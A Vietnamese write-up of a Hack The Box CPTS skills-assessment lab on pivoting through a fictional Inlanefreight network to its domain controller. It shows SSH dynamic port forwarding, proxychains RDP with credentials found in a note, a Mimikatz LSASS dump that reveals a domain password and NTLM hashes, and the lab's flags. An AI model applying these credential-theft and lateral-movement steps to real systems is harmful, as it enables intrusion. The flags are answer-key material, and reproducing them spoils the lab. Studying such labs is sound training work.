---
title: 'HTB: Pivoting, Tunneling, and Port Forwarding'         
description: 'Một machine ở phần Skills Assessment của Module Pivoting, Tunneling, and Port Forwarding trong path CPTS' # required
pubDate: '2026-08-26'        # required
category: 'CPTS'             # optional
tags: ['HTB', 'CPTS']      # optional
---

# Pivoting, Tunneling, and Port Forwarding - Skills Assessment

## Context

Đây là một lab trong phần Skills Assessment của Module Pivoting, Tunneling, and Forwarding trong path CPTS. Đề bài cho chúng ta 1 kịch bản khi một thành viên trong team đang pentest hệ thống của công ty Inlanefreight thì bị chuyển sang một project khác vào phút cuối. Trước khi đi anh ấy để lại cho chúng ta 1 webshell để chúng ta có thể tiếp tục công việc. Chúng ta cần sử dụng web shell này để tiếp tục liệt kê các host, xác định các dịch vụ đang chạy, và sử dụng các dịch vụ đấy hoặc các giao thức để nhảy vào mạng nội bộ của Inlanefreight. 

## **Objectives**

- Bắt đầu từ bên ngoài bằng Pwnbox và truy cập hệ thống đầu tiên qua web shell được đặt sẵn.
- Sử dụng quyền truy cập web shell để thu thập thông tin và nhảy vào host nội bộ.
- Tiếp tục thu thập thông tin và di chuyển ngang cho tới khi đến được Inlanefreight Domain Controller và đọc flag liên quan.
- Sử dụng bất kì dữ liệu, thông tin đăng nhập, scripts, hoặc thông tin khác trong môi trường để thực hiện nỗ lực chuyển tiếp kết nối của bạn.
- Thu thập tất cả flag có thể tìm thấy.

## Enumeration

Khi truy cập IP target được cho sẵn bằng trình duyệt chúng ta truy cập ngay được vào web shell mà thành viên trong team đã để lại trong lần pentest trước. Sau một lúc tìm kiếm thông tin, chúng ta phát hiện trong thư mục home của user `webadmin` có 2 tập tin đáng chú ý là `for-admin-eyes-only` và `id_rsa`. Chúng ta có quyền để đọc các tập tin này, khi đọc ta biết được `for-admin-eyes-only` là một ghi chú có chứa nội dung rất có thể là thông tin đăng nhập của user `mlefay` còn `id_rsa` rất có thể là file private key có thể dùng để đăng nhập ssh tới user `webadmin` mà không cần mật khẩu.Lateral Movement/ Pivot

![image.png](/images/Pivoting,%20Tunneling,%20and%20Port%20Forwarding%20-%20Skills%20/image.png)

## Lateral Movement/ Pivoting

Sử dụng file `id_rsa` chúng ta thành công đăng nhập vào tài khoản user `webadmin` với ssh giúp thuận tiện hơn cho việc chuyển tiếp kết nối sau này. Kiểm tra các giao diện mạng mà máy này đang có ta thấy nó có 2 giao diện mạng là `10.129.136.219` và `172.16.5.15`. `10.129.136.219` là giao diện ta có thể truy cập được từ PwnBox hoặc khi sử dụng VPN còn `172.16.5.15` là mạng nội bộ không thể truy cập từ bên ngoài được. Để các công cụ của chúng ta có thể tương tác với các máy trong dải mạng này ta cần phải thiết lập chuyển tiếp cổng động với SSH (SSH dynamic port forwarding) để biến máy tấn công thành một Socks Proxy tại cổng 9050 đồng thời dùng kết nối SSH tới máy web server làm điểm ra trung chuyển các gói tin vào dài mạng nội bộ . Đầu tiên sử dụng câu lệnh sau để thiết lập chuyển tiếp cổng động với SSH.

```bash
ssh -i id_rsa -D 9050  webadmin@10.129.136.219
```

Sau đó vào `/etc/proxychains.conf` và thêm dòng `socks4 	127.0.0.1 9050` vào dưới cùng để cho Proxychains biết được cần định tuyến gói tin qua cổng 9050 để Socks Listener có thể nhận được gói tin để chuyển qua máy web server. Sau khi thiết lập xong chúng ta quét dải mạng 172.16.5.0 để tìm ra các máy khác đang hoạt động để làm mục tiêu di chuyển ngang tiếp theo. Chúng ta sẽ sử dụng Ping Sweep để gửi gói tin ICMP tới các máy trong mạng 172.16.5.0 để tìm ra các máy đang hoạt động nếu chúng phản hồi lại với chúng ta. Chúng ta sẽ sử dụng câu lệnh ping với vòng lặp for ngay trên terminal của máy web server luôn, không sử dụng các công cụ như nmap trước vì nó sẽ tốn nhiều thời gian và tạo ra động tĩnh lớn. 

```bash
webadmin@inlanefreight:~$ for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
64 bytes from 172.16.5.15: icmp_seq=1 ttl=64 time=0.102 ms
64 bytes from 172.16.5.35: icmp_seq=1 ttl=128 time=4.03 ms

```

Ở đây ta nhận được 2 kết quả 1 là từ ip 172.16.5.15 là ip của máy web server mà chúng ta đang sử dụng, 2 là từ ip 172.16.5.35 mà chúng ta chưa biết. Nhìn vào giá trị TTL là 128 rất có thể đây là máy Windows, nếu là máy Windows thì sẽ có rất nhiều thứ cho chúng ta khai thác như AD. Lúc trước khi thu thập thông tin ở máy web server ta thu được một file chứa nội dung như sau:

```bash
webadmin@inlanefreight:~$ cat /home/webadmin/for-admin-eyes-only 
# note to self,
in order to reach server01 or other servers in the subnet from here you have to us the user account:mlefay
with a password of : 
Plain Human work!
```

Nó ghi rằng nếu muốn truy cập server01 hoặc các máy chủ khác trong subnet từ máy này thì cần phải dùng user `mlefay` với mật khẩu `Plain Human work!` . Ta sẽ thử RDP tới 172.16.5.35 với thông tin đăng nhập này qua Proxychains từ máy tấn công. 

```bash
proxychains xfreerdp /v:172.16.5.35 /u:mlefay /p:'Plain Human work!' /d:.
```

Sau khi đăng nhập thành công ta tiến hành kiểm tra user `mlefay` thuộc những nhóm quyền nào.

```bash

GROUP INFORMATION
-----------------

Group Name                                                    Type             SID          Attributes                                        
============================================================= ================ ============ ==================================================
Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Group used for deny only                          
BUILTIN\Administrators                                        Alias            S-1-5-32-544 Group used for deny only                          
BUILTIN\Remote Desktop Users                                  Alias            S-1-5-32-555 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\REMOTE INTERACTIVE LOGON                         Well-known group S-1-5-14     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                                      Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                                Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account                                    Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                                         Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level                        Label            S-1-16-8192                                                    

```

Ta thấy user `mlefay` thuộc nhóm Local Administrator đủ để cho ta chạy các công cụ như mimikatz. Đồng thời khi kiểm tra ổ C: ta cũng tìm được flag đầu tiên `S1ngl3-Piv07-3@sy-Day` . Sau một lúc kiểm tra các thư mục trên máy cũng như SMB ta không thu được thông tin gì quan trọng cả. Khi kiểm tra các giao diện mạng ta thấy máy này cũng có 2 giao diện mạng nhưng khác với máy web server. Nó có thuộc 2 dải mạng với 2 ip là 172.16.5.35 mà ta đã biết và 172.16.6.35 một dải mạng mới. Ta tiếp tục sử dụng Ping Sweep để tìm các ip đang hoạt động trong giải này, lần này chạy trên cmd của Windows nên câu lệnh sẽ khác với lần trước. Ta nhận được 3 phản hồi từ 3 ip, 1 từ ip của chính máy chúng ta 172.16.6.35 và 2 ip mới là 172.16.6.25 và 172.16.6.45. Khi ta thử đăng nhập vào máy 172.16.6.25 với user `mlefay` thì nhận được thông báo thông tin đăng nhập này không sử dụng được.

![image.png](/images/Pivoting,%20Tunneling,%20and%20Port%20Forwarding%20-%20Skills%20/image%201.png)

Có vẻ như cần có tài khoản domain để đăng nhập vào máy này. Ta sẽ quay lại với việc thu thập thông tin tiếp, vì có quyền Administrator nên chúng ta sẽ sử dụng Mimikatz để trích xuất các thông tin đăng nhập, tài khoản được lưu trong bộ nhớ RAM thông qua tiến trình LSASS.

```bash

  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::logonpasswords

<ĐÃ CẮT BỚT>

Authentication Id : 0 ; 3801285 (00000000:003a00c5)
Session           : RemoteInteractive from 2
User Name         : mlefay
Domain            : PIVOT-SRV01
Logon Server      : PIVOT-SRV01
Logon Time        : 8/27/2026 6:03:22 AM
SID               : S-1-5-21-1602415334-2376822715-119304339-1003
  msv :	
   [00000003] Primary
   * Username : mlefay
   * Domain   : PIVOT-SRV01
   * NTLM     : 2831bf1e4e0841d882328d5481fb5c92
   * SHA1     : ccb38ae19c47a04fa01542f30466d6c48ddc18d7
  tspkg :	
  wdigest :	
   * Username : mlefay
   * Domain   : PIVOT-SRV01
   * Password : (null)
  kerberos :	
   * Username : mlefay
   * Domain   : PIVOT-SRV01
   * Password : (null)
  ssp :	
  credman :	

Authentication Id : 0 ; 163794 (00000000:00027fd2)
Session           : Service from 0
User Name         : vfrank
Domain            : INLANEFREIGHT
Logon Server      : ACADEMY-PIVOT-D
Logon Time        : 8/27/2026 4:29:05 AM
SID               : S-1-5-21-3858284412-1730064152-742000644-1103
  msv :	
   [00000003] Primary
   * Username : vfrank
   * Domain   : INLANEFREIGHT
   * NTLM     : 2e16a00be74fa0bf862b4256d0347e83
   * SHA1     : b055c7614a5520ea0fc1184ac02c88096e447e0b
   * DPAPI    : 97ead6d940822b2c57b18885ffcc5fb4
  tspkg :	
  wdigest :	
   * Username : vfrank
   * Domain   : INLANEFREIGHT
   * Password : (null)
  kerberos :	
   * Username : vfrank
   * Domain   : INLANEFREIGHT.LOCAL
   * Password : Imply wet Unmasked!
  ssp :	
  credman :	

```

Ta thấy bộ nhớ có lưu mật khẩu của tài khoản vfrank dưới dạng plain text và ta biết được nó thuộc domain INLANEFREIGHT đúng thứ ta đang tìm kiếm. Quay lại RDP sử dụng thông tin đăng nhập vừa tìm thấy để đăng nhập vào máy ở ip 172.16.6.25. Sau khi đăng nhập thành công ta tìm thấy flag ở trong ổ C: tiếp `N3tw0rk-H0pp1ng-f0R-FuN` . Đồng thời cũng tìm thấy một ổ đĩa mạng đã được ánh xạ tên AutomateDCAdmin. Sau khi kiểm tra địa chỉ ip của ổ Z: và so sánh với địa chỉ ip của máy Domain Controller ta thấy nó hoàn toàn trùng khớp suy ra đây chính là ổ đĩa của máy Domain Controller được Admin mount vào ổ Z.

![image.png](/images/Pivoting,%20Tunneling,%20and%20Port%20Forwarding%20-%20Skills%20/image%202.png)

```bash
C:\Users\vfrank>net use                                                                                                 
New connections will be New connections will be remembered.
Status       Local     Remote                    Network

-------------------------------------------------------------------------------
OK           Z:        \\172.16.10.5\C$          Microsoft Windows Network
The command completed successfully.

C:\Users\vfrank>nslookup dc01
DNS request timed out.
    timeout was 2 seconds.
Server:  UnKnown
Address:  172.16.10.5

```

Truy cập và ta lấy được flag cuối cùng `3nd-0xf-Th3-R@inbow!`.